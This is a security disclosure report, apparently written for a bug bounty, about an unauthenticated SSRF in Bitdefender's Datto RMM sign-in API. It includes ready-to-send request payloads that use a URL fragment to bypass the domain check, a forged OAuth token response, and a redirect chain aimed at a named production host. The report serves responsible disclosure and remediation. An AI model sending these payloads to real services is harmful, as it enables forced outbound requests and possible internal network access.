# Unauthenticated server-side request forgery in Datto RMM sign-in

| Field | Assessment |
| --- | --- |
| Severity | Provisional Medium, CVSS 3.1 **5.3** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N`); the integrity rating depends on the reachable destination's handling of the forced POST. |
| CWE | CWE-918, Server-Side Request Forgery |
| OWASP | A10:2021, Server-Side Request Forgery |
| Affected component | `POST https://datto.rmm.bitdefender.com/api/user/signIn` (hosted integration; build version not exposed, observed 2026-09-23 UTC) |

The host is covered by the program's `*.bitdefender.com` scope and is not on its excluded-host list. The vulnerable request originates in Bitdefender's integration API; no flaw in third-party Datto software is alleged.

## Summary

The unauthenticated Datto RMM sign-in API accepts `rmmServerAddress` with an arbitrary HTTPS host and path if the URL ends in a fragment such as `#x.centrastage.net`. The fragment makes the supplied string appear to end with an allowed Datto domain, but URL parsing does not include the fragment in the HTTP destination. The Bitdefender server then sends an OAuth password-grant POST to the attacker-selected host and path. It also uses an attacker-supplied OAuth access token in a follow-up GET if the selected host returns one.

This is a verified cross-boundary server-side request. Testing was limited to a researcher-owned webhook listener. No internal address, existing tenant, or other user's data was accessed.

## Reproduction

1. Create an HTTPS request collector that records incoming methods, paths, headers, and bodies. The attached PoC creates a temporary Webhook.site URL automatically.
2. Send the following request with the collector's hostname. Use only dummy API credentials.

```http
POST /api/user/signIn HTTP/1.1
Host: datto.rmm.bitdefender.com
Content-Type: application/json

{"rmmApiKey":"bb-poc-user","rmmApiSecret":"bb-poc-pass","rmmServerAddress":"https://<owned-collector>.webhook.site/poc?marker=datto-ssrf#x.centrastage.net"}
```

3. The API responds with `400 Invalid Datto RMM credentials.` when the collector returns a non-OAuth response. Despite that error, the collector receives a request from the Datto integration server:

```http
POST /poc?marker=datto-ssrf HTTP/1.1
Host: <owned-collector>.webhook.site
Content-Type: application/x-www-form-urlencoded
Authorization: Basic cHVibGljLWNsaWVudDpwdWJsaWM=

username=bb-poc-user&password=bb-poc-pass&grant_type=password
```

The observed outbound source IP was `74.234.78.221`. A first root-path callback was captured at `2026-09-23 18:23:24 UTC`; a separate path-and-query callback was captured at `18:24:35 UTC`. The `#x.centrastage.net` fragment was absent from the outbound URL as expected.

A sanitized snapshot of both collector events is in [`datto-ssrf-evidence.json`](datto-ssrf-evidence.json).

4. As a control, submit `https://<owned-collector>.webhook.site` without the fragment. It also produces `400 Invalid Datto RMM credentials.`, but no request reaches the collector. An explicit `:443` port with the fragment did reach the collector. An `http://` URL with the fragment did not produce a callback; only HTTPS was verified.

## Response handling observed

When a fresh owned collector returned HTTP 200 with:

```json
{"access_token":"codex-test-token","token_type":"Bearer","expires_in":60}
```

the API returned `404 ERR2` (“Tenant not registered”) and made a second request to the same collector with `Authorization: Bearer codex-test-token`. This shows that the server processes the attacker-controlled response. The returned body itself was not reflected to the caller. After this test, `GET /api/tenant` returned `404 Tenant is not registered`, while `GET /api/tenant/settings`, `/api/gz/companies`, and `/api/events` all returned `401`; no protected read access or account takeover was established. The frontend offers a subsequent tenant registration flow, but it was not exercised because it would write a production tenant record.

Changing the owned collector's response between HTTP 200 non-JSON, 401, and 500 still produced a generic `400 Invalid Datto RMM credentials.` for the initial sign-in request. HTTP 500 caused retry requests to the collector. These results do not establish direct response-body exfiltration.

In a separate controlled test, the `rmmServerAddress` was set to the following URL. The HTTPS redirector returned HTTP 302 to a second researcher-owned collector:

```text
https://httpbin.org/redirect-to?url=https%3A%2F%2F<owned-collector>%2Fredirect-test%3Fmarker%3Ddatto-redirect&status_code=302#x.centrastage.net
```

The collector received two GET requests at the selected path and query from `74.234.78.221`, showing that cross-origin HTTPS redirects are followed and the POST can become a GET. A redirect to an HTTP collector produced no callback; HTTP downgrade was not established. The redirected GETs carried no Authorization header or body.

## Root cause and impact

The public React source map at [`/static/js/main.201a2cea.js.map`](https://datto.rmm.bitdefender.com/static/js/main.201a2cea.js.map) contains `pages/Login.js`; its client-side URL check permits `#` before a required `centrastage.net` suffix (around source line 110). That check does not accept a path and query before the fragment, whereas the API did. It illustrates a related validation weakness, but does not reveal the server's exact implementation. The server behavior itself proves the destination check can be bypassed.

An unauthenticated caller can make the Bitdefender service issue HTTPS POST requests to arbitrary origins, paths, and query strings from its own network context. A cross-origin redirect can also cause a GET to an attacker-selected HTTPS URL. The POST body contains attacker-supplied `rmmApiKey` and `rmmApiSecret` values as OAuth username and password. A controlled response can trigger a follow-up GET with a bearer token supplied by the attacker. Access to internal HTTPS services is a plausible consequence of this request capability, but was not tested and should not be treated as an observed data disclosure or authentication bypass.

## Remediation

Parse `rmmServerAddress` as a URL before validation. Require HTTPS, reject fragments and userinfo, and validate the parsed hostname against an exact set of Datto RMM API hostnames or a strict `.centrastage.net` label suffix. Apply the same destination policy after redirects and DNS resolution, including rejection of private, loopback, and link-local IP addresses. Keep the allowed path set fixed if the integration does not need caller-selected paths.
